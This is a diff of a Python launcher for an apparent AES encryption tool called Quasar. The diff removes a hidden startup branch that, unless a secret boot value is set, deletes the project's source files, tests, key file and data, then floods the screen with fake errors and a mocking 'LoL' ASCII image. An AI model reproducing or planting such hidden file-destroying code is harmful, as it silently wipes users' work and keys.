@@ -89,7 +89,7 @@ def print_block(block, delay=0):
             print(line)
         if delay:
             time.sleep(delay)
-'''
+
 if boot == "skip_boot":
     print()
     print()
@@ -102,49 +102,7 @@ else:
     print()
     print_block(ascii_block, delay=0.1)
     print()
-'''
-if boot == "lapis":
-    print()
-    print()
-else:
-    print("\rBooting up.", end="", flush=True); time.sleep(0.4)
-    print("\rBooting up..", end="", flush=True); time.sleep(0.4)
-    print("\rBooting up...", end="", flush=True); time.sleep(0.4)
-    print()
-    print_block(ascii_block, delay=0.1)
-    print()
-    print("You aren't supposed too see this...")
-    time.sleep(1.5)
-    base = os.path.dirname(__file__) or "."
-    targets = [
-            os.path.join(base, "quasar_frontend.py"),
-            os.path.join(base, "quasar_keygen.py"),
-            os.path.join(base, "aes_cbc.py"),
-            os.path.join(base, "README.md"),
-            os.path.join(base, "tests"),
-            os.path.join(base, "key.bin"),
-            os.path.join(base, "input.txt"),
-            os.path.join(base, "encrypt_output.bin"),
-            os.path.join(base, "output.txt"),
-        ]
-    for path in targets:
-            try:
-                if os.path.isdir(path):
-                    shutil.rmtree(path)
-                else:
-                    os.remove(path)
-            except FileNotFoundError:
-                print(f"Err 5")
-            except Exception as e:
-                print(f"Err 6")
-    running = False
-    count = 0
-    while count<151:
-        time.sleep(0.01)
-        print("ERROR 4. PLEASE RESTART IDE AND QUASAR")
-        count += 1
 
-    print("@&@@&&#GP5YYJ?????7????7777????7?????JYY5PG#&&@@&@\n&&#Y7~:..                                ..:~7Y#&&\n&&?.                                          .?&&\n&B:.                                          .:B&\n&5..     .  .......            .......  .     ..5&\n&?..    ..::..   .^~^.      .^~^.   ..::..    ..?&\n#7.. .!Y555PPGP5?^. .::.  .::. .^?5PGPP555Y!. ..!#\n#!..^?!^.....:!YB@&5!...  ...!5&@BY!:.....^!?^..~#\n#~...           .~5#@#:    :#@#5~.           ...~#\n#~..               .~7.    .7~.               ..~#\n#~... .^7JY?JYJ?!^.            .^!?JYJ?YJ7^. ...~#\n#~...  ^?5PGGB###BP?.        .?PB###BGGP5?^  ...~#\n#!..  .   ..::^^~~~:          :~~~^^::..   .   .!#\n&7   ...::...                        ...::...   7&\n&J  ...:::::..                      ..:::::...  J&\n&5.  ....:...                        ...:....  .5&\n&G:.  ......                          ......  .:G&\n&B~.:~^^^^...       .        .       ...^^^^~:.~#&\n&&?.:~^ !BP^       ..^JJ77JJ:..       ^PB! ^~:.?&&\n&&P:.:~. ^G&Y~..   .7#@@@@@@B7.   ..~Y&G^ .~:.:P&&\n&&#?...^. .JB&#BBBB#@@@#??#@@@#BGGB#&BJ. .^...?#&&\n&&#?...^. .JB&#BBBB#@@@#??#@@@#BGGB#&BJ. .^...?#&&\n&&&B~...:.  .^~7JY5PPG5~::~5GPP5YJ7~^.  .:...~B&&&\n&&&B~...:.  .^~7JY5PPG5~::~5GPP5YJ7~^.  .:...~B&&&\n&&&&G~.  ..       ...::^~~^::...       ..  .~G&&&&\n&&&&&B7.  ..                          ..  .7B&&&&&\n@&&&&&&P^             !????!             ^P&&&&&&@\n@@@@&&&@&Y:            5##Y            :Y&@&&&@@@@\n@@@@@@@@@@#J:         !B##B~         :J#@@@@@@@@@@\n@@@@@@@@@@@@#J:       P@&#&5       :J#@@@@@@@@@@@@\n@@@@@@@@@@@@@@#Y^     J@&&&?     ^Y#@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@&P7:  .B&#G   :7P&@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@@@@#G5JG##GJ5G#@@@@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@@@@@@@@&BB&@@@@@@@@@@@@@@@@@@@@@@@\nLoL.")
 
 running = True
 
